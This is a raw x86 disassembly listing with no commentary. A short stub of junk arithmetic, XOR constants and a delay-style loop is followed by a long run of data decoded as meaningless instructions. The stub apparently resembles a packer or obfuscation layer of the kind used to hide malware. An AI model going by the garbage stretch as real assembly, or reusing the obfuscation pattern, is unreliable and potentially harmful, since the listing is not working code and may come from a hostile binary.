  40185d:	mov    DWORD PTR [ebp-0x1c],eax
  401860:	mov    eax,DWORD PTR [ebp-0x1c]
  401863:	xor    ecx,0x76fe
  401869:	push   esi
  40186a:	sbb    ecx,ecx
  40186c:	push   edi
  40186d:	adc    DWORD PTR ds:0x430546,ebx
  401873:	mov    edi,0xf89f2dad
  401878:	mov    DWORD PTR [eax],edi
  40187a:	mov    DWORD PTR ds:0x430542,0x13
  401884:	cmp    DWORD PTR ds:0x430542,0x0
  40188b:	je     0x4018c5
  401891:	cmp    DWORD PTR ds:0x430542,0x21
  401898:	jne    0x4018a9
  40189e:	push   0x4555
  4018a3:	call   DWORD PTR ds:0x42eaa4
  4018a9:	mov    ebx,DWORD PTR ds:0x430542
  4018af:	dec    ebx
  4018b0:	mov    DWORD PTR ds:0x430542,ebx
  4018b6:	jmp    0x401884
  4018bb:	add    DWORD PTR ds:0x42e75e,0x42e762
  4018c5:	mov    eax,DWORD PTR [ebp-0x14]
  4018c8:	or     ecx,0x5402
  4018ce:	mov    ebx,DWORD PTR [ebp-0x8]
  4018d1:	mov    ecx,0x7510856
  4018d6:	xor    eax,ecx
  4018d8:	mov    esi,0x32729d
  4018dd:	sbb    DWORD PTR ds:0x4304b2,0x704c
  4018e7:	xor    ebx,ecx
  4018e9:	xor    edx,edx
  4018eb:	xor    DWORD PTR ds:0x42e76a,0x430542
  4018f5:	add    eax,esi
  4018f7:	add    ebx,esi
  4018f9:	sbb    DWORD PTR ds:0x430552,0x21a7
  401903:	jmp    0x401cb4
  401908:	ret    0xa9a5
  40190b:	imul   ebp,DWORD PTR [ecx+0x7b],0xffffffc4
  40190f:	mov    ebp,0x8064be64
  401914:	mov    al,bl
  401916:	bnd ret 
  401918:	push   ss
  401919:	jne    0x401999
  40191b:	jle    0x40189f
  40191d:	jno    0x40199d
  40191f:	jle    0x4018ba
  401921:	cld    
  401922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401923:	dec    ebx
  401924:	jmp    0x401944
  401926:	pop    edi
  401927:	arpl   WORD PTR [eax-0x5a861959],si
  40192d:	or     bh,BYTE PTR [edx+eax*8]
  401930:	mov    al,0xde
  401932:	sti    
  401933:	jbe    0x4018c2
  401935:	aas    
  401936:	adc    eax,0x55e1c8f8
  40193b:	ins    DWORD PTR es:[edi],dx
  40193c:	cwde   
  40193d:	adc    eax,0x47fc7539
  401942:	adc    BYTE PTR [eax-0x2ad09d07],al
  401948:	mov    bl,BYTE PTR [bx+si]
  40194b:	xchg   DWORD PTR [ecx+0x19],edi
  40194e:	mov    ch,BYTE PTR ds:0xceaa6e84
  401954:	inc    esp
  401955:	stc    
  401956:	lods   eax,DWORD PTR ds:[esi]
  401957:	cs scas al,BYTE PTR es:[edi]
  401959:	mov    ah,0xe7
  40195b:	xchg   edx,eax
  40195c:	inc    edx
  40195d:	jnp    0x40198c
  40195f:	sbb    eax,0x4e8499d5
  401964:	mov    al,0x63
  401966:	idiv   edx
  401968:	int    0x7
  40196a:	and    DWORD PTR [esp+esi*2],esp
  40196d:	and    BYTE PTR [edx+0x63340d1],dl
  401973:	test   ebx,ecx
  401975:	dec    eax
  401976:	adc    ebx,ebx
  401978:	ja     0x401925
  40197a:	mov    ebx,0xb9ac8c66
  40197f:	fsub   DWORD PTR [ebp+0x78845ffb]
  401985:	cld    
  401986:	nop
  401987:	(bad)  
  401988:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401989:	test   al,0x26
  40198b:	sbb    bl,BYTE PTR [edi]
  40198d:	retf   0x24c1
  401990:	in     eax,dx
  401991:	imul   esp,DWORD PTR [esi-0x55],0xb280f4fb
  401998:	clc    
  401999:	mov    bl,BYTE PTR [ebp-0xccb816e]
  40199f:	in     al,0xb4
  4019a1:	mul    DWORD PTR [ecx+0x7]
  4019a4:	(bad)  {k7}{z}
  4019a9:	fadd   DWORD PTR [edi-0x67]
  4019ac:	adc    al,0x61
  4019ae:	stos   BYTE PTR es:[edi],al
  4019af:	jle    0x401976
  4019b1:	push   esi
  4019b2:	and    eax,0xe39d754
  4019b7:	dec    ebx
  4019b8:	nop
  4019b9:	xchg   esi,eax
  4019ba:	mov    cl,0x61
  4019bc:	cmp    ebx,DWORD PTR [edx-0x3b607ab0]
  4019c2:	aam    0x7b
  4019c4:	adc    BYTE PTR [esi-0x5488755d],dh
  4019ca:	fisub  WORD PTR [esi]
  4019cc:	or     al,0x29
  4019ce:	pusha  
  4019cf:	xchg   ebp,eax
  4019d0:	ins    BYTE PTR es:[edi],dx
  4019d1:	xor    dh,0xac
  4019d4:	shl    dl,0xc5
  4019d7:	pop    es
  4019d8:	xor    BYTE PTR [esp+eiz*4-0x9ad9f06],al
  4019df:	or     ch,BYTE PTR [esi]
  4019e1:	pop    ds
  4019e2:	mov    bl,0x82
  4019e4:	inc    ebp
  4019e5:	pop    ebx
  4019e6:	jl     0x4019e6
  4019e8:	pop    esp
  4019e9:	push   eax
  4019ea:	xchg   ecx,eax
  4019eb:	mov    eax,ds:0x9911df44
  4019f0:	mov    edx,DWORD PTR [ebp-0x711ce061]
  4019f6:	jnp    0x401a07
  4019f8:	jl     0x4019b8
  4019fa:	mov    ecx,DWORD PTR [ecx]
  4019fc:	gs sbb esi,eax
  4019ff:	pop    edi
  401a00:	add    al,0x6b
  401a02:	mul    ch
  401a04:	(bad)  
  401a05:	addr16 mov ebx,esi
  401a08:	hlt    
  401a09:	mov    esp,0xa6569172
  401a0e:	sbb    BYTE PTR [esi],al
  401a10:	xchg   edx,eax
  401a11:	bound  edx,QWORD PTR [edx]
  401a13:	xchg   DWORD PTR [eax+ecx*1],ecx
  401a16:	jmp    0x65d25396
  401a1b:	add    BYTE PTR [ecx],dh
  401a1d:	test   eax,0xb2716828
  401a22:	(bad)  
  401a23:	daa    
  401a24:	jp     0x401a89
  401a26:	mov    DWORD PTR [edx+ecx*2],ebp
  401a29:	shl    DWORD PTR [edx+0x1e],1
  401a2c:	adc    BYTE PTR [edi],cl
  401a2e:	or     ebx,DWORD PTR [ebx+0xe]
  401a31:	cli    
  401a32:	sbb    edx,DWORD PTR [eax-0x1]
  401a35:	popf   
  401a36:	cmp    ebx,DWORD PTR [ecx-0x5fc2743]
  401a3c:	sbb    BYTE PTR [esi-0x38319fd8],ch
  401a42:	pop    ds
  401a43:	jecxz  0x401aa2
  401a45:	sub    esp,DWORD PTR [ebp+0x3c61b3ba]
  401a4b:	jb     0x401a33
  401a4d:	cwde   
  401a4e:	fs mov eax,cs:0x5ce32511
  401a55:	sub    edx,DWORD PTR [edi+0x21]
  401a58:	push   ds
  401a59:	add    BYTE PTR [esi],bh
  401a5b:	sti    
  401a5c:	lods   al,BYTE PTR ds:[esi]
  401a5d:	push   ss
  401a5e:	aas    
  401a5f:	(bad)
  401a63:	jae    0x401a43
  401a65:	mov    al,0xbe
  401a67:	enter  0x4ed4,0xe9
  401a6b:	adc    ah,BYTE PTR [eax-0x42982b0b]
  401a71:	icebp  
  401a72:	xchg   ecx,eax
  401a73:	out    dx,eax
  401a74:	sub    BYTE PTR [ebx+0x6b],0x2c
  401a78:	imul   ebp,DWORD PTR [ebp+0xee6dacc],0x7
  401a7f:	inc    esp
  401a80:	add    bl,BYTE PTR [ecx]
  401a82:	lods   eax,DWORD PTR ds:[esi]
  401a83:	mov    ebp,0xf1d2f0b0
  401a88:	jge    0x401aab
  401a8a:	xor    eax,0xa1ca9541
  401a8f:	mov    al,ds:0xd8783249
  401a94:	sbb    ecx,DWORD PTR [ebx]
  401a96:	xor    BYTE PTR [eax+0x21],dl
  401a99:	outs   dx,DWORD PTR ds:[esi]
  401a9a:	popa   
  401a9b:	mov    bh,0x11
  401a9d:	jns    0x401a22
  401a9f:	stc    
  401aa0:	or     ecx,DWORD PTR [ebx]
  401aa2:	shl    ah,0x6
  401aa5:	pusha  
  401aa6:	add    DWORD PTR [edi+0x6e],edi
  401aa9:	into   
  401aaa:	jnp    0x401ad2
  401aac:	cmp    ecx,DWORD PTR [esi+0x780a2aad]
  401ab2:	(bad)  
  401ab3:	and    al,0xc3
  401ab5:	pop    edx
  401ab6:	mov    dl,0xf
  401ab8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ab9:	push   es
  401aba:	ficomp DWORD PTR [ecx+0x5727ec5b]
  401ac0:	mov    cl,0x9e
  401ac2:	pop    es
  401ac3:	xor    DWORD PTR ds:0x9689badd,esi
  401ac9:	mov    dh,0x9c
  401acb:	jp     0x401aa6
  401acd:	and    BYTE PTR [edx-0x1bf6c7b3],cl
  401ad3:	fnstcw WORD PTR [ebp-0x66]
  401ad6:	mov    cl,BYTE PTR [esi-0x2f14a7b9]
  401adc:	stc    
  401add:	pop    ebx
  401ade:	xchg   ebp,eax
  401adf:	inc    eax
  401ae0:	ins    BYTE PTR es:[edi],dx
  401ae1:	sub    BYTE PTR [ecx],0xae
  401ae4:	(bad)  ss:[ebp+0x3da5af89]
  401aeb:	pop    ds
  401aec:	or     eax,0x6ab134f2
  401af1:	out    0xe3,al
  401af3:	jp     0x401b6c
  401af5:	cmp    eax,0x50760954
  401afa:	push   eax
  401afb:	mov    bl,0xaa
  401afd:	cmp    eax,DWORD PTR [eax+0x685eb7de]
  401b03:	aad    0x57
  401b05:	inc    esi
  401b06:	popf   
  401b07:	jb     0x401aec
  401b09:	scas   al,BYTE PTR es:[edi]
  401b0a:	fstp   QWORD PTR [eax-0x1e51f023]
  401b10:	xor    esi,ebp
  401b12:	gs jbe 0x401b32
  401b15:	sub    al,0xf5
  401b17:	icebp  
  401b18:	(bad)  
  401b19:	or     al,0xfd
  401b1b:	ror    DWORD PTR [ebp-0x182bdb63],0x9d
  401b22:	and    DWORD PTR [eax-0x17591b60],ecx
  401b28:	add    edi,ebx
  401b2a:	and    bl,bl
  401b2c:	sub    eax,0xb9102040
  401b31:	in     al,dx
  401b32:	data16 mov dh,BYTE PTR [ecx+0x6889514a]
  401b39:	call   0xecf14d1a
  401b3e:	add    bl,BYTE PTR [eax-0x6a601776]
  401b44:	mov    esp,0xf867227e
  401b49:	je     0x401bb4
  401b4b:	mov    ebx,eax
  401b4d:	mov    cl,0x92
  401b4f:	jns    0x401b7c
  401b51:	mov    ch,0xf7
  401b53:	je     0x401b02
  401b55:	xchg   ecx,eax
  401b56:	and    al,0x7c
  401b58:	dec    eax
  401b59:	push   ecx
  401b5a:	jmp    0xfd1f:0xd7cd42c9
  401b61:	popf   
  401b62:	or     DWORD PTR [edi+0x7],ebp
  401b65:	loope  0x401b83
  401b67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b68:	in     eax,dx
  401b69:	and    DWORD PTR [ebx],esi
  401b6b:	ficom  WORD PTR [eax+0x4a]
  401b6e:	sti    
  401b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b70:	sahf   
  401b71:	pop    ss
  401b72:	scas   al,BYTE PTR es:[edi]
  401b73:	aad    0x12
  401b75:	push   cs
  401b76:	sbb    ecx,ecx
  401b78:	mov    dl,0xaa
  401b7a:	mov    esp,DWORD PTR [eax]
  401b7c:	pop    edi
  401b7d:	sbb    al,0xdd
  401b7f:	nop
  401b80:	mov    dl,0x8b
  401b82:	test   cl,cl
  401b84:	retf   0xc04f
  401b87:	jae    0x401b8c
  401b89:	and    eax,0xbe083f75
  401b8e:	dec    esp
  401b8f:	(bad)  
  401b90:	ins    DWORD PTR es:[edi],dx
  401b91:	mov    ecx,0x529327e9
  401b96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b97:	adc    edi,DWORD PTR [edx]
  401b99:	sub    eax,0x88942822
  401b9e:	cmc    
  401b9f:	les    ebp,FWORD PTR ds:[esi-0x7]
  401ba3:	mov    eax,ds:0xbd00fdad
  401ba8:	fcomi  st,st(6)
  401baa:	js     0x401bb4
  401bac:	xchg   ebp,eax
  401bad:	xchg   esp,eax
  401bae:	int3   
  401baf:	test   DWORD PTR ds:0x3dc0967b,esp
  401bb5:	pushf  
  401bb6:	mov    gs,esi
  401bb8:	jo     0x401b74
  401bba:	call   FWORD PTR [ecx]
  401bbc:	push   ecx
  401bbd:	pop    edi
  401bbe:	xor    BYTE PTR [edi+0x512afa7],cl
  401bc4:	out    0x33,al
  401bc6:	push   0xb
  401bc8:	jge    0x401b71
  401bca:	and    ah,BYTE PTR [ebx+0x3c]
  401bcd:	retf   
  401bce:	mov    bl,0xd1
  401bd0:	vandps xmm2,xmm6,XMMWORD PTR [esi-0xf]
  401bd5:	popa   
  401bd6:	imul   edi,ecx,0xffffff8f
  401bd9:	pushf  
  401bda:	repnz sub cl,dh
  401bdd:	loope  0x401b9d
  401bdf:	(bad)  
  401be0:	jnp    0x401b86
  401be2:	push   ss
  401be3:	imul   esp,DWORD PTR ds:0xb296d599,0x402324df
  401bed:	rol    cl,0x10
  401bf0:	xchg   edi,eax
  401bf1:	mov    eax,0xc7f49c5e
  401bf6:	clc    
  401bf7:	hlt    
  401bf8:	mov    edx,0x24845500
  401bfd:	mov    DWORD PTR [edx+0x40],ebx
  401c00:	call   0x2576:0x8369fdc0
  401c07:	inc    ebp
  401c08:	(bad)  
  401c09:	enter  0xbd7,0xa
  401c0d:	xchg   BYTE PTR [esi],al
  401c0f:	daa    
  401c10:	idiv   ebx
  401c12:	mov    ds:0xbdea58d6,eax
  401c17:	xor    edx,ebp
  401c19:	daa    
  401c1a:	lds    eax,FWORD PTR [edx-0x69]
  401c1d:	sbb    al,0x5d
  401c1f:	imul   ebp,DWORD PTR [edi+ebp*4-0x7eba0ffa],0x9d2624ee
  401c2a:	adc    DWORD PTR [edx+0x753d413c],ecx
  401c30:	add    ch,cl
  401c32:	jecxz  0x401c32
  401c34:	mov    ecx,0x9b7b0a62
  401c39:	outs   dx,BYTE PTR ds:[esi]
  401c3a:	mov    bh,bh
  401c3c:	call   0x1742:0xc6bd7d5c
  401c43:	inc    edx
  401c44:	sbb    al,0x93
  401c46:	icebp  
  401c47:	scas   eax,DWORD PTR es:[edi]
  401c48:	jmp    0x6f99c40f
  401c4d:	sahf   
  401c4e:	inc    ebx
  401c4f:	(bad)  
  401c50:	cmp    cl,BYTE PTR ds:0x97c0a6ce
  401c56:	jns    0x401c0e
  401c58:	inc    esi
  401c59:	dec    edx
  401c5a:	sub    eax,ebp
  401c5c:	mov    ds:0xbc9222a1,al
  401c61:	sbb    eax,0x7da0b537
  401c66:	pop    es
  401c67:	(bad)  
  401c69:	xchg   ecx,eax
  401c6a:	stos   DWORD PTR es:[edi],eax
  401c6b:	(bad)  
  401c6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c6d:	dec    ebp
  401c6e:	repz mov ds:0xfb311192,al
  401c74:	scas   eax,DWORD PTR es:[edi]
  401c75:	mov    ?,WORD PTR [edi-0x2b86894]
  401c7b:	mov    dl,0xe8
  401c7d:	es out 0x77,eax
  401c80:	and    BYTE PTR [ecx+0x57b6caba],0x22
  401c87:	test   al,0x7d
  401c89:	mov    BYTE PTR [ecx+0x7],al
  401c8c:	inc    ebx
  401c8d:	sbb    BYTE PTR ds:0x7344788,bh
  401c93:	mov    ecx,eax
  401c95:	or     al,0x87
  401c97:	mov    ds:0xd6357ff6,eax
  401c9c:	xchg   edx,eax
  401c9d:	adc    BYTE PTR [ebx-0x3bbacf06],cl
  401ca3:	int3   
  401ca4:	cmc    
  401ca5:	ins    DWORD PTR es:[edi],dx
  401ca6:	mov    ds,WORD PTR ds:0x5ec5a128
  401cac:	jae    0x401caf
  401cae:	retf   0x8734
  401cb1:	test   eax,0xf3f7b1fa
  401cb6:	mov    DWORD PTR ds:0x42ee20,0x29
  401cc0:	jmp    0x402071
  401cc5:	pop    ds
  401cc6:	nop
  401cc7:	jl     0x401d20
  401cc9:	jge    0x401d46
  401ccb:	and    eax,0x749e668
  401cd0:	jns    0x401d27
  401cd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cd3:	pop    edx
  401cd4:	pop    ds
  401cd5:	mov    edx,0x827e7e08
  401cda:	jno    0x401d5a
  401cdc:	jle    0x401cd6
  401cde:	sbb    eax,0xe8da6c0e
  401ce3:	pop    edx
  401ce4:	push   edi
  401ce5:	xchg   edi,eax
  401ce6:	scas   eax,DWORD PTR es:[edi]
  401ce7:	pop    ss
  401ce8:	jl     0x401cf3
  401cea:	push   0xffffffdd
  401cec:	sbb    BYTE PTR [esi],ch
  401cee:	in     al,dx
  401cef:	imul   DWORD PTR [eax+0x2992d58]
  401cf5:	sti    
  401cf6:	pop    esi
  401cf7:	dec    edx
  401cf8:	jl     0x401d05
  401cfa:	sbb    eax,0x5463c625
  401cff:	stos   DWORD PTR es:[edi],eax
  401d00:	lds    ecx,FWORD PTR [esi+0x1e78fcf6]
  401d06:	shl    bh,1
  401d08:	scas   eax,DWORD PTR es:[edi]
  401d09:	inc    eax
  401d0a:	ss mov bl,0x24
  401d0d:	rcl    BYTE PTR ds:0xcf4736fe,1
  401d13:	pop    ds
  401d14:	cmp    cl,BYTE PTR [ecx+0xf]
  401d17:	jmp    0xb768b58c
  401d1c:	dec    ecx
  401d1d:	retf   
  401d1e:	jno    0x401cf8
  401d20:	mov    al,0x60
  401d22:	dec    esp
  401d23:	inc    ebp
  401d24:	iret   
  401d25:	arpl   WORD PTR [edi+ebp*2-0x214c380e],si
  401d2c:	je     0x401d8c
  401d2e:	sub    dh,bh
  401d30:	and    ebp,DWORD PTR [edi+ecx*2+0x7badf596]
  401d37:	dec    edi
  401d38:	xchg   ebp,eax
  401d39:	imul   DWORD PTR [edi-0x1a]
  401d3c:	or     eax,0xe8a7eccf
  401d41:	sub    eax,0x3026bcd1
  401d46:	jae    0x401da7
  401d48:	cs dec ecx
  401d4a:	sti    
  401d4b:	jbe    0x401da7
  401d4d:	mov    dl,0xcb
  401d4f:	or     edi,DWORD PTR [ebx]
  401d51:	mov    cl,0x6d
  401d53:	retf   
  401d54:	jp     0x401d50
  401d56:	mov    ?,WORD PTR [eax+ebp*1+0x711ac127]
  401d5d:	lahf   
  401d5e:	mov    dh,0x1d
  401d60:	mov    ch,BYTE PTR [edi]
  401d62:	adc    BYTE PTR [ebx-0x6c0b0306],0x28
  401d69:	or     eax,0xaa2a39b9
  401d6e:	mov    cl,0xc
  401d70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d71:	bound  esi,QWORD PTR [eax+0x7ead1d09]
  401d77:	cmp    bl,BYTE PTR [ebx]
  401d79:	add    bh,BYTE PTR cs:[edi+0x35]
  401d7d:	pop    ss
  401d7e:	xor    al,0x3
  401d80:	mov    dh,BYTE PTR [ebp+0x75151eff]
  401d86:	inc    ebx
  401d87:	jo     0x401ded
  401d89:	sub    cl,BYTE PTR [ebp-0x29191ba5]
  401d8f:	mov    WORD PTR [edx-0x39b1c450],fs
  401d95:	shl    ch,1
  401d97:	jl     0x401d59
  401d99:	iret   
  401d9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d9b:	inc    edx
  401d9c:	mov    ch,cl
  401d9e:	jmp    0x74a1:0xb2a81402
  401da5:	mov    cl,0x18
  401da7:	cli    
  401da8:	add    DWORD PTR [ecx+0x5d],ebp
  401dab:	add    DWORD PTR [edi-0x6d87950c],0x1b
  401db2:	adc    BYTE PTR [ebx],cl
  401db4:	push   cs
  401db5:	sub    bh,0xf8
  401db8:	mov    dh,bh
  401dba:	mov    ch,0x36
  401dbc:	push   esi
  401dbd:	ja     0x401e2b
  401dbf:	sbb    BYTE PTR [eax-0x6c],dl
  401dc2:	scas   al,BYTE PTR es:[edi]
  401dc3:	mov    ebp,0x3df944c
  401dc8:	xchg   ebp,eax
  401dc9:	ins    BYTE PTR es:[edi],dx
  401dca:	bound  esp,QWORD PTR [edx]
  401dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dcd:	cmp    dh,BYTE PTR [eax]
  401dcf:	js     0x401dcd
  401dd1:	sbb    al,0xf2
  401dd3:	je     0x401dfc
  401dd5:	or     dl,BYTE PTR [esi]
  401dd7:	xchg   ecx,eax
  401dd8:	icebp  
  401dd9:	push   edi
  401dda:	jg     0x401e30
  401ddc:	mov    BYTE PTR [ecx-0x6c85d9c5],ch
  401de2:	sbb    DWORD PTR [ecx+0x26],esp
  401de5:	jecxz  0x401e4c
  401de7:	and    edi,DWORD PTR [edi-0x28]
  401dea:	cwde   
  401deb:	adc    esp,esp
  401ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dee:	xor    cl,BYTE PTR [esi]
  401df0:	loop   0x401e11
  401df2:	mov    esi,cs
  401df4:	cmp    BYTE PTR [esi],0xa0
  401df7:	cmp    al,0x2
  401df9:	call   0x61154e30
  401dfe:	int3   
  401dff:	scas   al,BYTE PTR es:[edi]
  401e00:	push   esp
  401e01:	pop    ecx
  401e02:	pop    ss
  401e03:	repnz std 
  401e05:	pop    ecx
  401e06:	or     eax,0xc6b03292
  401e0b:	push   ebp
  401e0c:	pop    eax
  401e0d:	inc    ebx
  401e0e:	xchg   edi,eax
  401e0f:	push   eax
  401e10:	adc    al,0x3b
  401e12:	sub    edi,DWORD PTR [edx-0x52]
  401e15:	fstp   QWORD PTR [ecx+0x3e9f109e]
  401e1b:	add    edi,DWORD PTR ds:0xff723412
  401e21:	int    0x4d
  401e23:	xor    al,0xfd
  401e25:	std    
  401e26:	sbb    DWORD PTR [ebx+0x4be09d46],esp
  401e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e2d:	and    al,0xdd
  401e2f:	retf   0xa056
  401e32:	out    dx,al
  401e33:	js     0x401e0b
  401e35:	push   edi
  401e36:	adc    esp,0xf94ebed9
  401e3c:	xor    ch,BYTE PTR [eax-0x6842af46]
  401e42:	fwait
  401e43:	sub    BYTE PTR [eax+0x7f],ch
  401e46:	cmp    esp,DWORD PTR [eax-0x5bff51d8]
  401e4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e4d:	(bad)  
  401e4e:	or     edi,DWORD PTR [esi-0x43]
  401e51:	push   edi
  401e52:	scas   al,BYTE PTR es:[edi]
  401e53:	lods   al,BYTE PTR ds:[esi]
  401e54:	repnz xor cl,BYTE PTR [edx-0x29]
  401e58:	cmp    eax,0x15db69bc
  401e5d:	sahf   
  401e5e:	adc    ecx,edi
  401e60:	stc    
  401e61:	stos   DWORD PTR es:[edi],eax
  401e62:	push   ebp
  401e63:	bound  eax,QWORD PTR [ebx]
  401e65:	push   DWORD PTR [ebp+0x6a]
  401e68:	xchg   ebx,eax
  401e69:	sub    edx,DWORD PTR [edi]
  401e6b:	sub    DWORD PTR [eax],0x793b551
  401e71:	ins    BYTE PTR es:[edi],dx
  401e72:	ins    DWORD PTR es:[edi],dx
  401e73:	mov    cl,0xe3
  401e75:	in     eax,dx
  401e76:	lds    edx,FWORD PTR [esi+ebx*2+0x14]
  401e7a:	mov    cl,0xbf
  401e7c:	fstp   TBYTE PTR [edi-0x762349f7]
  401e82:	loopne 0x401e64
  401e84:	mov    edi,0xd9ea6546
  401e89:	rcr    DWORD PTR [eax-0x2d],1
  401e8c:	push   ss
  401e8d:	lods   eax,DWORD PTR ds:[esi]
  401e8e:	stc    
  401e8f:	popa   
  401e90:	int    0x69
  401e92:	(bad)
  401e96:	lahf   
  401e97:	jle    0x401ee6
  401e99:	pop    eax
  401e9a:	inc    eax
  401e9b:	popa   
  401e9c:	jne    0x401ed9
  401e9e:	mov    ecx,DWORD PTR [edi+0x32]
  401ea1:	xor    esp,eax
  401ea3:	push   0xffffffb1
  401ea5:	int3   
  401ea6:	dec    esp
  401ea7:	les    edx,FWORD PTR [ecx-0x116815b9]
  401ead:	cwde   
  401eae:	xchg   ebp,eax
  401eaf:	lods   al,BYTE PTR ds:[esi]
  401eb0:	loop   0x401eac
  401eb2:	ror    dl,1
  401eb4:	aad    0x40
  401eb6:	jecxz  0x401f07
  401eb8:	add    DWORD PTR [eax+0x5a79beee],ebp
  401ebe:	add    DWORD PTR [esp+edi*4+0x5edf9724],edx
  401ec5:	rcl    DWORD PTR [ebp+ebx*1+0x2d91ed3d],cl
  401ecc:	les    ebp,FWORD PTR [edi+0x33]
  401ecf:	push   eax
  401ed0:	sbb    DWORD PTR [esp+esi*8+0x16],edx
  401ed4:	pop    edi
  401ed5:	leave  
  401ed6:	daa    
  401ed7:	sub    BYTE PTR [esi-0x28438cc7],ah
  401edd:	add    al,0x27
  401edf:	cs stos DWORD PTR es:[edi],eax
  401ee1:	pushw  0xcdb2
  401ee5:	mov    esp,0xdb7fe744
  401eea:	lea    esp,[ebx+0x49]
  401eed:	pop    edi
  401eee:	js     0x401f1d
  401ef0:	mov    ebp,gs
  401ef2:	dec    ecx
  401ef3:	mov    ah,0xdc
  401ef5:	pusha  
  401ef6:	cmp    eax,0x2390cff5
  401efb:	inc    esp
  401efc:	sub    dh,dh
  401efe:	fld    QWORD PTR [esp+ecx*2]
  401f01:	cmp    al,0x5c
  401f03:	adc    eax,0x8c761fd6
  401f08:	ja     0x401e92
  401f0a:	or     BYTE PTR [ebp+0x6b5eb1b9],ch
  401f10:	or     esi,DWORD PTR [ecx+0x4a]
  401f13:	ins    BYTE PTR es:[edi],dx
  401f14:	sub    al,cl
  401f16:	add    esi,DWORD PTR [ecx+0x5b]
  401f19:	ficomp WORD PTR [edx-0x7b]
  401f1c:	add    edx,esp
  401f1e:	je     0x401f4d
  401f20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f21:	mov    ebx,DWORD PTR [esi+0x49136ac]
  401f27:	or     cl,dl
  401f29:	clc    
  401f2a:	int    0x96
  401f2c:	push   ecx
  401f2d:	lahf   
  401f2e:	jg     0x401f71
  401f30:	sub    ah,BYTE PTR [eax-0x9bf4949]
  401f36:	mov    WORD PTR [edx+0x346c6fe1],cs
  401f3c:	in     eax,dx
  401f3d:	dec    edx
  401f3e:	dec    esp
  401f3f:	ror    DWORD PTR [ebx+0x7b5f7ad7],1
  401f45:	and    esi,edx
  401f47:	jb     0x401ee4
  401f49:	mov    bh,0x6d
  401f4b:	call   0x694db02a
  401f50:	dec    eax
  401f51:	dec    edx
  401f52:	cld    
  401f53:	push   ebp
  401f54:	test   BYTE PTR [edi],ch
  401f56:	add    cl,dh
  401f58:	xor    BYTE PTR [esi],cl
  401f5a:	fucomip st,st(2)
  401f5c:	sub    al,0x94
  401f5e:	cmc    
  401f5f:	jge    0x401ee8
  401f61:	aam    0x4b
  401f63:	test   eax,0x21443e60
  401f68:	xchg   esp,eax
  401f69:	retf   
  401f6a:	adc    BYTE PTR es:[ebx],ch
  401f6d:	mov    WORD PTR [edi+esi*1-0x9],ds
  401f71:	add    BYTE PTR [esi+0x4a46bc45],0x59
  401f78:	add    ebx,esp
  401f7a:	jb     0x401f06
  401f7c:	sbb    cl,BYTE PTR [edx-0x51]
  401f7f:	test   eax,0x4ea05d29
  401f84:	dec    ebx
  401f85:	sti    
  401f86:	jns    0x401f13
  401f88:	popf   
  401f89:	push   ecx
  401f8a:	das    
  401f8b:	loope  0x401f76
  401f8d:	or     edi,DWORD PTR [eax+0x19]
  401f90:	je     0x401f5f
  401f92:	jmp    0x778ddd95
  401f97:	jg     0x402001
  401f99:	sbb    ebx,DWORD PTR [eax-0xca26804]
  401f9f:	dec    ebx
  401fa0:	loopne 0x401f5c
  401fa2:	loope  0x401f45
  401fa4:	jmp    0xa7cfeb10
  401fa9:	sub    dh,BYTE PTR ds:0xe5f2c065
  401faf:	xchg   DWORD PTR fs:[eax-0x47],esp
  401fb3:	jp     0x401ff3
  401fb5:	wbinvd 
  401fb7:	leave  
  401fb8:	iret   
  401fb9:	pop    eax
  401fba:	ja     0x401f7c
  401fbc:	stos   BYTE PTR es:[edi],al
  401fbd:	lods   eax,DWORD PTR ds:[esi]
  401fbe:	aam    0xd
  401fc0:	pop    ebx
  401fc1:	jbe    0x401fa8
  401fc3:	push   ds
  401fc4:	iret   
  401fc5:	add    al,0x64
  401fc7:	xor    ah,0x8b
  401fca:	push   ecx
  401fcb:	cmp    eax,DWORD PTR [edx+0x6428165d]
  401fd1:	xchg   edi,eax
  401fd2:	addr16 and edx,ecx
  401fd5:	dec    esp
  401fd6:	arpl   WORD PTR [ebp-0x7b],sp
  401fd9:	div    BYTE PTR [esi]
  401fdb:	inc    edx
  401fdc:	cli    
  401fdd:	rcr    DWORD PTR [ebx-0xe],1
  401fe0:	dec    ebp
  401fe1:	inc    edi
  401fe2:	rcr    DWORD PTR [ecx],1
  401fe4:	out    0xbe,eax
  401fe6:	cs mov esi,0xa200882b
  401fec:	ret    0xd941
  401fef:	jge    0x401ff6
  401ff1:	sub    ebx,DWORD PTR [edx-0x20ac4fe1]
  401ff7:	mov    ah,0xc4
  401ff9:	fldcw  WORD PTR [eax-0x1d175058]
  401fff:	push   esp
  402000:	xchg   ecx,eax
  402001:	ds das 
  402003:	xlat   BYTE PTR ds:[ebx]
  402004:	jb     0x402070
  402006:	cmp    ah,cl
  402008:	sub    eax,0x739391ed
  40200d:	pop    ebx
  40200e:	inc    edx
  40200f:	adc    eax,0x7356c63
  402014:	leave  
  402015:	push   eax
  402016:	cwd    
  402018:	sti    
  402019:	out    0xb0,eax
  40201b:	push   edi
  40201c:	add    eax,0x6b9a6d51
  402021:	xchg   DWORD PTR ds:0xce5ffe1e,edi
  402027:	sbb    dl,dl
  402029:	fwait
  40202a:	(bad)  
  40202d:	hlt    
  40202e:	inc    esp
  40202f:	mov    esi,0x3c73815e
  402034:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402036:	loopne 0x402081
  402038:	push   eax
  402039:	push   edi
  40203a:	xchg   esi,eax
  40203b:	mov    edi,DWORD PTR [eax-0x49466e33]
